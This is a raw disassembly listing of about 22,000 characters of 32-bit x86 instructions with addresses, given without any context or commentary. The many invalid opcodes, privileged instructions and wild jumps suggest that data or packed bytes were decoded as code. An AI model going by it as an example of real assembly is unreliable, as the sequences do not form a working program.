  429a54:	cmp    DWORD PTR [ecx],ecx
  429a56:	or     al,0x8
  429a58:	add    al,BYTE PTR [ebp+0x2c]
  429a5b:	xor    eax,0x7350845
  429a60:	or     BYTE PTR [ebp+0x7],cl
  429a63:	lea    ebx,[eax-0x748dcdff]
  429a69:	add    BYTE PTR [eax*2-0x74b21438],cl
  429a70:	mov    edx,DWORD PTR [eax]
  429a72:	cld    
  429a73:	dec    ebp
  429a74:	push   eax
  429a75:	sub    edx,DWORD PTR [ecx-0x75]
  429a78:	add    eax,0xf172fc
  429a7d:	or     BYTE PTR [ebp+0x7],cl
  429a80:	add    eax,ecx
  429a82:	or     al,0x72
  429a84:	add    DWORD PTR [eax],eax
  429a86:	mov    ebx,0x29c2c1
  429a8b:	inc    ebp
  429a8c:	mov    eax,DWORD PTR [ebx]
  429a8e:	cmp    eax,0x3004d1c
  429a94:	xbegin 0x66c8268e
  429a9a:	clc    
  429a9b:	or     BYTE PTR [ebp+0x45],al
  429a9e:	cmp    DWORD PTR ds:0x78b089c,esi
  429aa4:	adc    BYTE PTR [ebp+0x45],cl
  429aa7:	lea    eax,[ebp+0x33727501]
  429aad:	add    cl,ch
  429aaf:	inc    ebp
  429ab0:	add    bl,ch
  429ab2:	add    BYTE PTR [ebx+0x45850845],cl
  429ab8:	je     0x429a45
  429aba:	push   ebx
  429abb:	or     al,0x85
  429abd:	dec    ebp
  429abe:	std    
  429abf:	mov    bh,bh
  429ac1:	mov    BYTE PTR [ebp-0x75],al
  429ac4:	mov    edi,eax
  429ac6:	or     al,0x89
  429ac8:	inc    ebp
  429ac9:	clc    
  429aca:	mov    esp,esp
  429acc:	hlt    
  429acd:	call   DWORD PTR [edi-0x37]
  429ad0:	push   eax
  429ad1:	or     al,0x51
  429ad3:	push   ebp
  429ad4:	xor    ebp,esp
  429ad6:	mov    esi,0x457251
  429adb:	cmp    dh,al
  429add:	pushf  
  429ade:	inc    ebp
  429adf:	(bad)  
  429ae0:	mov    edi,eax
  429ae2:	or     al,0x85
  429ae4:	add    al,bh
  429ae6:	inc    eax
  429ae8:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  429aec:	or     ah,bh
  429aee:	inc    eax
  429aef:	push   eax
  429af0:	jmp    0x429b43
  429af2:	mov    eax,DWORD PTR ds:0xe8720c
  429af8:	mov    DWORD PTR [ebp-0x8],eax
  429afb:	jne    0x429b42
  429afd:	jmp    0x429a8a
  429aff:	mov    ebp,DWORD PTR [eax]
  429b01:	clc    
  429b02:	retf   0xff50
  429b05:	push   ecx
  429b06:	mov    DWORD PTR ds:0x757210,eax
  429b0c:	mov    ecx,DWORD PTR [ebp-0x4]
  429b0f:	sub    esp,DWORD PTR [ebx-0x77]
  429b12:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429b19:	or     ah,bh
  429b1b:	pop    es
  429b1c:	ds cwde 
  429b1e:	push   DWORD PTR [edx]
  429b20:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  429b26:	(bad)  
  429b27:	mov    bh,bh
  429b29:	jmp    0x429b17
  429b2b:	leave  
  429b2c:	jne    0x429b36
  429b2e:	call   0x2f9488
  429b33:	in     al,dx
  429b34:	dec    ebp
  429b35:	add    dh,BYTE PTR [ebx]
  429b37:	add    BYTE PTR [ebx],al
  429b39:	inc    ebp
  429b3a:	cmp    edi,DWORD PTR [eax]
  429b3c:	je     0x429ada
  429b3e:	mov    eax,edi
  429b40:	or     al,0xf0
  429b42:	add    BYTE PTR [ebp+0x458bf845],al
  429b48:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  429b4e:	adc    al,0x7
  429b50:	enter  0x9fc0,0xa5
  429b54:	rol    BYTE PTR [eax],0x5e
  429b57:	mov    ecx,ecx
  429b59:	or     al,0xc
  429b5b:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  429b62:	jmp    0x429b63
  429b64:	push   ebp
  429b65:	mov    esp,ebp
  429b67:	cld    
  429b68:	inc    ebp
  429b69:	inc    ebp
  429b6a:	or     DWORD PTR [ecx+0x457dec10],0x0
  429b71:	push   esi
  429b72:	push   esi
  429b73:	mov    edi,0x7af080f
  429b78:	add    bh,al
  429b7a:	test   DWORD PTR [eax+0x3a7320f],ebx
  429b80:	add    BYTE PTR [ecx+0x4540100f],cl
  429b86:	mov    ebp,eax
  429b88:	mov    ebp,edi
  429b8a:	lock call edx
  429b8d:	fcom   DWORD PTR [ebp+0x45]
  429b90:	mov    eax,0x148a8b
  429b95:	push   ecx
  429b96:	enter  0xc145,0x83
  429b9a:	cmp    cl,BYTE PTR [eax]
  429b9c:	add    BYTE PTR [ebp+0x4d],al
  429b9f:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429ba5:	call   0xffa29714
  429baa:	cmp    eax,DWORD PTR [ebp-0xc]
  429bad:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429bb1:	push   ebp
  429bb2:	(bad)
  429bb5:	std    
  429bb6:	lock push DWORD PTR [edi+0x5d08fcdb]
  429bbd:	inc    ebp
  429bbe:	(bad)  
  429bbf:	call   0xff7c984f
  429bc4:	add    al,BYTE PTR [ebp+0x37]
  429bc7:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  429bcd:	jne    0x429bcf
  429bcf:	(bad)  
  429bd0:	cmp    edi,esp
  429bd2:	jne    0x429c05
  429bd4:	mov    edi,edi
  429bd6:	or     BYTE PTR [ebx-0x307f0b49],cl
  429bdc:	pop    ds
  429bdd:	into   
  429bde:	je     0x429ba1
  429be0:	mov    ebx,DWORD PTR [esi]
  429be2:	or     BYTE PTR [ebp-0x49],al
  429be5:	mov    esp,DWORD PTR [esi-0x77]
  429be8:	mov    esi,0xfc451f0c
  429bed:	mov    eax,DWORD PTR [eax]
  429bef:	or     al,0x66
  429bf1:	sar    bl,0x3b
  429bf4:	xor    esi,DWORD PTR [ebp+0x66]
  429bf7:	xor    ecx,edi
  429bf9:	pop    edi
  429bfa:	adc    bl,BYTE PTR [ebx+0x78]
  429bfd:	ret    0xff
  429c00:	cld    
  429c01:	inc    ebp
  429c02:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429c08:	cld    
  429c09:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429c10:	push   0xffffff83
  429c12:	pop    edi
  429c13:	or     BYTE PTR [ebp+0x53],dh
  429c16:	xorps  xmm1,xmm2
  429c19:	test   BYTE PTR [eax+eax*1],bh
  429c1c:	add    BYTE PTR [eax],al
  429c1e:	adc    eax,eax
  429c20:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  429c28:	jmp    DWORD PTR [eax]
  429c2a:	ror    al,0x5e
  429c2d:	inc    ebp
  429c2e:	leave  
  429c2f:	xor    ecx,DWORD PTR [eax]
  429c31:	and    DWORD PTR [ebx-0x3ec90708],ecx
  429c37:	add    ch,al
  429c39:	xor    edi,edi
  429c3b:	xor    DWORD PTR [ebx],0x660033fc
  429c41:	mov    DWORD PTR [ebp-0xc],ecx
  429c44:	pcmpgtw mm0,mm0
  429c47:	add    dl,ah
  429c49:	leave  
  429c4a:	mov    edi,DWORD PTR [esi-0x7d]
  429c4d:	push   ax
  429c4f:	dec    ebp
  429c50:	mov    esi,DWORD PTR [ebx-0x75]
  429c53:	lea    ebp,[eax-0x7c00fffc]
  429c59:	xor    eax,DWORD PTR [eax]
  429c5b:	sysret 
  429c5d:	dec    ebp
  429c5e:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  429c65:	push   WORD PTR [ecx+0x8]
  429c69:	jne    0x429c2c
  429c6b:	ud0    ecx,DWORD PTR [ecx]
  429c6e:	mov    esi,DWORD PTR [edx]
  429c70:	lods   al,BYTE PTR ds:[esi]
  429c71:	add    BYTE PTR [eax],al
  429c73:	data16 (bad) 
  429c75:	iret   
  429c76:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  429c7d:	cli    
  429c7e:	inc    ebp
  429c7f:	cmp    al,0x8d
  429c81:	add    BYTE PTR [esi+0x2d],ah
  429c84:	inc    ebp
  429c85:	pop    ebp
  429c86:	lea    ecx,[edi]
  429c88:	mov    dl,bh
  429c8a:	add    BYTE PTR [edi],cl
  429c8c:	mov    DWORD PTR [eax+eax*8],edi
  429c8f:	mov    ebx,0x3a87
  429c94:	add    BYTE PTR [ebx],ch
  429c96:	inc    ebp
  429c97:	data16 (bad) 
  429c99:	clc    
  429c9a:	int3   
  429c9b:	cmp    eax,DWORD PTR [eax]
  429c9d:	je     0x429c28
  429c9f:	push   0xffffffc8
  429ca1:	pop    edi
  429ca2:	xchg   DWORD PTR [ebp+0x0],eax
  429ca5:	data16 add BYTE PTR [ebp+0x45],cl
  429ca9:	lea    cx,[ebp+0x10]
  429cad:	jb     0x429caf
  429caf:	jmp    0x429c3a
  429cb1:	call   eax
  429cb3:	clc    
  429cb4:	xchg   DWORD PTR [edi+0x1],edi
  429cb7:	mov    eax,DWORD PTR [eax]
  429cb9:	or     BYTE PTR [ebp-0x49],al
  429cbc:	lea    eax,[eax+0x74003154]
  429cc2:	push   edi
  429cc3:	inc    edx
  429cc4:	jge    0x429cc5
  429cc6:	mov    DWORD PTR [edi],ecx
  429cc8:	fdiv   DWORD PTR [edi-0x6]
  429ccb:	inc    DWORD PTR [eax]
  429ccd:	xor    edx,DWORD PTR [eax+0x5f]
  429cd0:	xchg   DWORD PTR [ebx+0x1],ebx
  429cd3:	ret    0x0
  429cd6:	xor    BYTE PTR [ebp-0x51],cl
  429cd9:	cmp    edi,0xf0ff8904
  429cdf:	data16 ror al,0x84
  429ce3:	rol    BYTE PTR [eax],0x3b
  429ce6:	add    al,dh
  429ce8:	dec    eax
  429ce9:	xchg   esp,eax
  429cea:	push   ebx
  429ceb:	jmp    0x429c78
  429ced:	push   ebp
  429cee:	add    esp,ebp
  429cf0:	add    ebp,esp
  429cf2:	mov    edx,DWORD PTR [edi+0x24]
  429cf5:	clc    
  429cf6:	dec    esi
  429cf7:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  429cfd:	cmp    BYTE PTR [ebx],al
  429cff:	jne    0x429c8a
  429d01:	xor    esp,eax
  429d03:	jmp    0x459e86
  429d08:	add    ebp,DWORD PTR [ecx+ecx*4]
  429d0b:	jne    0x429d01
  429d0d:	call   0xffcc9a67
  429d12:	clc    
  429d13:	xchg   edi,eax
  429d14:	sti    
  429d15:	add    DWORD PTR [ebx],eax
  429d17:	add    BYTE PTR [ebp+0x47],bl
  429d1a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  429d20:	pop    ebp
  429d21:	mov    DWORD PTR [esi-0x48],esi
  429d24:	jmp    0x429d6d
  429d26:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  429d2c:	(bad)  
  429d2e:	cmp    al,0x0
  429d30:	cmp    eax,DWORD PTR [ebp+0x18]
  429d33:	lea    ebx,[ebp-0x56]
  429d36:	jle    0x429d38
  429d38:	jae    0x429cc3
  429d3a:	mov    eax,esp
  429d3c:	call   0xb900:0x8b005587
  429d43:	inc    ebp
  429d44:	push   ebp
  429d45:	lea    ecx,[ebp-0x27ff4f12]
  429d4b:	mov    eax,edi
  429d4d:	int3   
  429d4e:	push   ebp
  429d4f:	xchg   edi,eax
  429d51:	add    esp,ebp
  429d53:	add    BYTE PTR [eax],al
  429d55:	inc    ebp
  429d56:	add    BYTE PTR [ebp+0x8b3255],cl
  429d5c:	cld    
  429d5d:	mov    DWORD PTR [edx],edi
  429d5f:	aam    0x75
  429d61:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  429d67:	mov    DWORD PTR [ebx-0x50],edx
  429d6a:	test   BYTE PTR [ebp-0x1],0xe8
  429d6e:	mov    eax,DWORD PTR [eax]
  429d70:	hlt    
  429d71:	add    al,al
  429d73:	mov    eax,DWORD PTR ds:0x890045a8
  429d79:	dec    DWORD PTR [ebx+0x45fdf0e8]
  429d7f:	inc    DWORD PTR [eax*2+0xf75854d]
  429d86:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  429d8c:	call   0x7298facd
  429d91:	je     0x429df1
  429d93:	js     0x429df4
  429d95:	lock ret 0x7e
  429d99:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  429d9f:	mov    edi,edi
  429da1:	sbb    al,bl
  429da3:	clc    
  429da4:	add    BYTE PTR [ebp-0x73],bh
  429da7:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  429dad:	ror    BYTE PTR [eax],1
  429daf:	dec    ebp
  429db0:	xchg   ebp,eax
  429db1:	mov    edi,edi
  429db3:	in     al,0x8b
  429db5:	jge    0x429d40
  429db7:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  429dbd:	clc    
  429dbe:	pop    esi
  429dbf:	fist   DWORD PTR [ebp+0x5d398b5d]
  429dc5:	clc    
  429dc6:	add    al,0x6e
  429dc8:	mov    eax,DWORD PTR [ebx]
  429dca:	mov    BYTE PTR [ebp+0x0],dl
  429dcd:	mov    edx,DWORD PTR [ebx-0x20]
  429dd0:	adc    esi,DWORD PTR [edi+0x5e005f36]
  429dd6:	add    eax,0x3b3a73
  429ddb:	adc    al,0x89
  429ddd:	pop    eax
  429dde:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  429de2:	ret    0xf08
  429de5:	cmp    al,0x2
  429de7:	mov    DWORD PTR [edx],esi
  429de9:	cld    
  429dea:	add    BYTE PTR [ebp+0x66],dl
  429ded:	add    eax,ebx
  429def:	add    esp,eax
  429df1:	sub    eax,eax
  429df3:	or     BYTE PTR [ecx-0x77f474bb],cl
  429df9:	add    BYTE PTR [eax],al
  429dfb:	mov    DWORD PTR [ebx-0x24],ebx
  429dfe:	push   edi
  429dff:	push   ebp
  429e00:	clc    
  429e01:	add    DWORD PTR [esi+0x1b0100],0x45
  429e08:	out    0xff,eax
  429e0a:	add    edx,DWORD PTR [eax]
  429e0c:	jmp    0x429df6
  429e0e:	cmp    ch,0x43
  429e11:	(bad)  
  429e12:	jmp    0x40c82664
  429e17:	je     0x429da3
  429e19:	mov    eax,DWORD PTR [eax-0x10c78704]
  429e1f:	inc    ebp
  429e20:	add    BYTE PTR [ebx-0x770375],al
  429e26:	add    ah,ch
  429e28:	add    edx,esp
  429e2a:	pop    edi
  429e2b:	pop    ebp
  429e2c:	push   ebp
  429e2d:	inc    ebx
  429e2e:	in     al,dx
  429e2f:	pop    ebp
  429e30:	in     al,dx
  429e31:	cmp    edx,DWORD PTR [edi-0x8]
  429e34:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  429e3b:	add    al,0x47
  429e3d:	push   ebp
  429e3e:	mov    esp,ebp
  429e40:	in     al,0x45
  429e42:	dec    ebp
  429e43:	push   esi
  429e44:	test   DWORD PTR [eax+0xff010f],esi
  429e4a:	add    BYTE PTR [eax+0xc018b],dh
  429e50:	leave  
  429e51:	inc    ebp
  429e52:	test   al,ch
  429e54:	add    dh,bh
  429e56:	add    bh,bh
  429e58:	dec    ebp
  429e59:	push   cs
  429e5a:	mov    DWORD PTR [ecx],eax
  429e5c:	hlt    
  429e5d:	push   es
  429e5e:	dec    ebp
  429e5f:	leave  
  429e60:	mov    DWORD PTR [eax],ecx
  429e62:	clc    
  429e63:	cmovge eax,ecx
  429e66:	mov    ecx,0x85c2f0
  429e6c:	clc    
  429e6d:	pop    DWORD PTR [ebp+0x1]
  429e70:	aas    
  429e71:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  429e78:	push   esi
  429e79:	add    BYTE PTR [ebp-0x4],al
  429e7c:	mov    DWORD PTR [eax],eax
  429e7e:	cld    
  429e7f:	inc    bp
  429e81:	add    DWORD PTR [edx],edi
  429e83:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  429e8b:	mov    ebx,0xcd4f68
  429e90:	mov    edi,DWORD PTR [ebx]
  429e92:	or     al,0x75
  429e94:	(bad)  
  429e95:	xor    ecx,ebx
  429e97:	enterw 0x4d01,0x87
  429e9c:	jmp    0x429ea2
  429ea1:	ret    
  429ea2:	inc    ebp
  429ea3:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  429ea9:	add    dh,cl
  429eab:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  429eb3:	icebp  
  429eb4:	or     BYTE PTR [eax+0x8f13bd2],al
  429eba:	inc    ebp
  429ebb:	inc    edx
  429ebc:	mov    ecx,DWORD PTR [edx]
  429ebe:	or     al,0xf9
  429ec0:	(bad)  
  429ec1:	jne    0x429e91
  429ec3:	mov    cl,0x0
  429ec6:	rol    BYTE PTR [esi+0x450134],1
  429ecc:	add    eax,edi
  429ece:	cld    
  429ecf:	ret    
  429ed0:	dec    ebp
  429ed1:	mov    ecx,DWORD PTR [edx+0x751c8583]
  429ed7:	mov    edi,0xf82c8534
  429edc:	jmp    0x429f5b
  429ede:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  429ee4:	mov    dl,0x8b
  429ee6:	sub    cl,BYTE PTR [eax]
  429ee8:	mov    ecx,ecx
  429eea:	in     al,dx
  429eeb:	test   cl,dh
  429eed:	add    BYTE PTR [edx],al
  429eef:	add    BYTE PTR [eax-0x377a97b3],al
  429ef5:	cmovge esi,esp
  429ef8:	add    eax,DWORD PTR [eax]
  429efa:	cld    
  429efb:	mov    eax,DWORD PTR [ecx]
  429efd:	adc    BYTE PTR [ebp+0x4d],cl
  429f00:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  429f06:	xor    cl,BYTE PTR [ebx+0x4533082b]
  429f0c:	cmp    esp,ebx
  429f0e:	jne    0x429eac
  429f10:	mov    eax,edi
  429f12:	adc    ah,ch
  429f14:	push   ebp
  429f15:	test   DWORD PTR [ebx],esi
  429f17:	clc    
  429f18:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  429f1e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  429f21:	dec    ebp
  429f22:	adc    bh,al
  429f24:	push   0x8b85ff10
  429f29:	clc    
  429f2a:	or     al,0x50
  429f2c:	(bad)  
  429f2d:	push   ecx
  429f2e:	retf   
  429f2f:	mov    ebx,0xff4d8dc8
  429f34:	mov    DWORD PTR [ebp+0x8],eax
  429f37:	xor    eax,DWORD PTR [ebp-0x75]
  429f3a:	cmp    ebp,DWORD PTR [ebx]
  429f3c:	lsl    ebx,WORD PTR [edi-0x8]
  429f40:	call   DWORD PTR [ebx-0x741bff75]
  429f46:	(bad)  
  429f47:	or     al,0x5b
  429f49:	dec    ebp
  429f4a:	or     BYTE PTR [ebx],dh
  429f4c:	inc    ebp
  429f4d:	xor    esi,DWORD PTR ds:0x708088d
  429f53:	in     eax,0x98
  429f55:	add    BYTE PTR [edx],dh
  429f57:	inc    ebp
  429f58:	pop    edi
  429f59:	xor    eax,edx
  429f5b:	test   DWORD PTR [eax],0x81108b8b
  429f61:	dec    ebp
  429f62:	sub    al,0x33
  429f64:	add    BYTE PTR [ebx],dh
  429f66:	push   esi
  429f67:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  429f6d:	mov    edi,eax
  429f6f:	or     BYTE PTR [ebp+0x45],al
  429f72:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  429f78:	cmp    cl,cl
  429f7a:	pushf  
  429f7b:	push   es
  429f7c:	mov    DWORD PTR [ebx-0x4],0xf817853b
  429f83:	dec    ebp
  429f84:	inc    ebp
  429f85:	and    BYTE PTR [eax],0x50
  429f88:	pushf  
  429f89:	push   0x4de4d1c7
  429f8e:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  429f94:	fsubr  st,st(1)
  429f96:	xlat   BYTE PTR ds:[ebx]
  429f97:	rol    bh,cl
  429f99:	mov    edx,esp
  429f9b:	or     BYTE PTR [ebp+0x4588f84d],al
  429fa1:	mov    ecx,DWORD PTR [eax]
  429fa3:	or     BYTE PTR [eax],al
  429fa5:	push   ebp
  429fa6:	mov    edi,DWORD PTR [eax+0xfc728b]
  429fac:	dec    ebp
  429fad:	enter  0xceba,0x8
  429fb1:	retf   0x1807
  429fb4:	ret    0x984d
  429fb7:	mov    esi,DWORD PTR [edx]
  429fb9:	or     al,0x33
  429fbb:	into   
  429fbc:	add    edx,esi
  429fbe:	add    ecx,edx
  429fc0:	bswap  eax
  429fc2:	ror    esi,0x98
  429fc5:	dec    ebp
  429fc6:	add    cl,ch
  429fc8:	mov    edi,edi
  429fca:	hlt    
  429fcb:	inc    esi
  429fcd:	inc    ebp
  429fce:	ret    0x4533
  429fd1:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  429fd7:	or     BYTE PTR [ebx],dh
  429fd9:	dec    ebp
  429fda:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  429fe0:	jne    0xff8c9fa7
  429fe6:	inc    ebp
  429fe7:	inc    ebp
  429fe8:	mov    esi,DWORD PTR [ebx]
  429fea:	clc    
  429feb:	pop    esi
  429fec:	ret    0xcaeb
  429fef:	mov    eax,esi
  429ff1:	call   0x5203f0c4
  429ff6:	dec    ebp
  429ff7:	add    eax,0xf8728b
  429ffc:	adc    eax,0xce0ccac9
  42a001:	push   ebp
  42a002:	ret    0xc6ec
  42a005:	in     al,dx
  42a006:	call   0x3342ed0f
  42a00b:	push   edi
  42a00c:	add    edi,eax
  42a00e:	xor    eax,eax
  42a010:	jmp    0x42a057
  42a012:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  42a018:	add    eax,edi
  42a01a:	shr    eax,cl
  42a01c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  42a022:	mov    edi,DWORD PTR [ecx]
  42a024:	in     al,dx
  42a025:	pushf  
  42a026:	ret    0x84c7
  42a029:	fcomp  DWORD PTR [eax-0x7607cd7b]
  42a02f:	inc    ebp
  42a030:	in     al,dx
  42a031:	cmp    BYTE PTR [ebp-0x64],al
  42a034:	mov    eax,edi
  42a036:	cld    
  42a037:	fmul   st(2),st
  42a039:	sbb    dl,al
  42a03b:	jmp    0x9c3b:0x374d45c1
  42a042:	jbe    0x42a00b
  42a044:	mov    esp,eax
  42a046:	clc    
  42a047:	add    BYTE PTR [ebp+0x0],cl
  42a04a:	mov    ecx,ecx
  42a04c:	lea    eax,[ebp-0x5]
  42a04f:	mov    edi,edi
  42a051:	call   0x51cdf09b
  42a056:	hlt    
  42a057:	xor    eax,edx
  42a059:	mov    esi,0x987284
  42a05e:	xor    cl,dl
  42a060:	mov    esi,eax
  42a062:	hlt    
  42a063:	into   
  42a064:	inc    ebp
  42a065:	scas   eax,DWORD PTR es:[edi]
  42a066:	mov    ebp,ecx
  42a068:	cld    
  42a069:	add    dl,cl
  42a06b:	add    dl,al
  42a06d:	inc    ebp
  42a06e:	shr    DWORD PTR [ebx],0x4d
  42a071:	xor    edi,DWORD PTR [ebx]
  42a073:	mov    DWORD PTR [edi],ecx
  42a075:	clc    
  42a076:	dec    esi
  42a077:	inc    ebp
  42a078:	dec    DWORD PTR [ebx-0x3d2b1775]
  42a07e:	ret    0xc6ca
  42a081:	mov    BYTE PTR [ebp-0x32],0x53
  42a085:	scas   eax,DWORD PTR es:[edi]
  42a086:	inc    ebp
  42a087:	jmp    0x42a0c0
  42a089:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  42a090:	pop    ebx
  42a091:	xor    ecx,DWORD PTR [ebp+0x3]
  42a094:	mov    eax,DWORD PTR [ebx]
  42a096:	clc    
  42a097:	test   edx,ecx
  42a099:	mov    ecx,esi
  42a09b:	cld    
  42a09c:	call   0x8ab6e5e6
  42a0a1:	xor    ecx,DWORD PTR [eax+0x4533f303]
  42a0a7:	add    ecx,DWORD PTR [ebx-0x4974072d]
  42a0ad:	fdiv   QWORD PTR [ebx]
  42a0af:	retf   0xce89
  42a0b2:	in     al,0xc1
  42a0b4:	inc    ebp
  42a0b5:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  42a0bb:	into   
  42a0bc:	mov    dh,0xc1
  42a0bf:	call   0x8c16e648
  42a0c4:	(bad)  
  42a0c5:	cld    
  42a0c6:	mov    ecx,DWORD PTR [ebp-0x14]
  42a0c9:	xor    eax,ecx
  42a0cb:	lea    eax,[ebp+0x8]
  42a0ce:	mov    esi,DWORD PTR [edx-0x4]
  42a0d1:	add    dl,al
  42a0d3:	inc    ebp
  42a0d4:	mov    esp,0x32d8988b
  42a0d9:	dec    ebp
  42a0da:	mov    esi,DWORD PTR [ebx]
  42a0dc:	cld    
  42a0dd:	xor    eax,edx
  42a0df:	sub    ebp,DWORD PTR [eax-0x75]
  42a0e2:	int    0xec
  42a0e4:	sub    ecx,eax
  42a0e6:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  42a0ec:	mov    esi,esp
  42a0ee:	call   0x3416ee77
  42a0f3:	inc    DWORD PTR [ebx]
  42a0f5:	mov    edi,DWORD PTR [ebx]
  42a0f7:	cld    
  42a0f8:	jne    0x42a147
  42a0fa:	mov    esi,DWORD PTR [ebx]
  42a0fc:	aam    0x8d
  42a0fe:	dec    ebp
  42a0ff:	or     BYTE PTR [ebx],dh
  42a101:	jb     0x42a106
  42a103:	add    BYTE PTR [edi+0x45],bl
  42a106:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  42a10d:	xor    ebp,esp
  42a10f:	xor    eax,edi
  42a111:	sub    edi,esp
  42a113:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  42a119:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  42a120:	inc    ebp
  42a121:	xor    ecx,DWORD PTR [ecx+0x45891403]
  42a127:	clc    
  42a128:	mov    eax,edi
  42a12a:	nop
  42a12b:	fadd   QWORD PTR [eax]
  42a12d:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  42a133:	jmp    0x42a0be
  42a135:	mov    eax,DWORD PTR [ecx]
  42a137:	fadd   DWORD PTR [eax]
  42a139:	inc    ebp
  42a13a:	or     DWORD PTR [ebx],esi
  42a13c:	dec    eax
  42a13d:	add    edx,DWORD PTR [ebx-0x2d]
  42a140:	dec    ebp
  42a141:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  42a147:	inc    ebp
  42a148:	push   eax
  42a149:	mov    dl,BYTE PTR [ecx-0xd]
  42a14c:	xor    ecx,DWORD PTR [ebp-0x45]
  42a14f:	(bad)  
  42a151:	rol    BYTE PTR [eax],0xc1
  42a154:	ret    
  42a155:	inc    ebp
  42a156:	inc    ebp
  42a157:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  42a15d:	xor    eax,ebx
  42a15f:	add    eax,DWORD PTR [ebp+0x23]
  42a162:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  42a168:	cmp    edi,0xc
  42a16b:	dec    ebp
  42a16c:	inc    ebp
  42a16d:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  42a173:	inc    ebp
  42a174:	mov    esi,DWORD PTR [ebx]
  42a176:	clc    
  42a177:	lea    eax,[ebp+0x45725407]
  42a17d:	add    BYTE PTR [ebp+eax*2-0x75],dh
  42a181:	xor    edi,DWORD PTR [eax]
  42a183:	mov    ecx,0xff8b8d4d
  42a188:	push   esp
  42a189:	enter  0x4df7,0x23
  42a18d:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  42a193:	mov    eax,DWORD PTR [ebx]
  42a195:	loopne 0x42a182
  42a197:	ret    0xc68b
  42a19a:	push   esp
  42a19b:	enter  0x9745,0x8b
  42a19f:	inc    ebp
  42a1a0:	cld    
  42a1a1:	mov    eax,edi
  42a1a3:	clc    
  42a1a4:	ret    
  42a1a5:	ret    0xc645
  42a1a8:	mov    esi,DWORD PTR [ebx]
  42a1aa:	cld    
  42a1ab:	pop    esi
  42a1ac:	mov    ebx,0x83458bc3
  42a1b2:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  42a1b6:	dec    ebp
  42a1b7:	cmp    BYTE PTR [ebx],dh
  42a1b9:	pushf  
  42a1ba:	add    edi,DWORD PTR [edx-0x7767a77]
  42a1c0:	fcom   DWORD PTR [ebp+0x45]
  42a1c3:	mov    edi,DWORD PTR [edx]
  42a1c5:	adc    al,0x9c
  42a1c7:	inc    ebp
  42a1c8:	(bad)  
  42a1c9:	mov    ebx,eax
  42a1cb:	adc    al,0x85
  42a1cd:	cmp    al,0x1
  42a1d0:	inc    ebp
  42a1d1:	add    BYTE PTR [ecx*2-0x74167464],bh
  42a1d8:	add    edx,DWORD PTR [eax-0x74bb0000]
  42a1de:	xor    eax,DWORD PTR [ebx]
  42a1e0:	add    edi,DWORD PTR [ecx+ecx*4]
  42a1e3:	mov    esp,esi
  42a1e5:	clc    
  42a1e6:	inc    ebp
  42a1e7:	inc    ebp
  42a1e8:	add    edx,DWORD PTR [esi+0xc]
  42a1eb:	mov    edi,0x7ff0845
  42a1f0:	in     al,dx
  42a1f1:	(bad)  
  42a1f2:	jne    0x42a18c
  42a1f4:	mov    esi,DWORD PTR [edx]
  42a1f6:	clc    
  42a1f7:	add    ebp,DWORD PTR [edx]
  42a1f9:	mov    edi,edi
  42a1fb:	in     al,dx
  42a1fc:	mov    DWORD PTR [ebp-0x10],eax
  42a1ff:	xor    eax,DWORD PTR [ebp+0x3]
  42a202:	and    BYTE PTR [ecx+0x458bf49c],cl
  42a208:	fmul   DWORD PTR [ebx-0x173caf39]
  42a20e:	lea    ecx,[ecx+0x45e8d4bc]
  42a214:	clc    
  42a215:	mov    edi,edi
  42a217:	cmp    BYTE PTR [ebp+0x4d],al
  42a21a:	test   DWORD PTR [eax+0x74],ecx
  42a21d:	inc    ecx
  42a21e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  42a224:	ret    
  42a225:	inc    eax
  42a226:	dec    DWORD PTR [ebx+0x4945f8f0]
  42a22c:	push   eax
  42a22d:	dec    eax
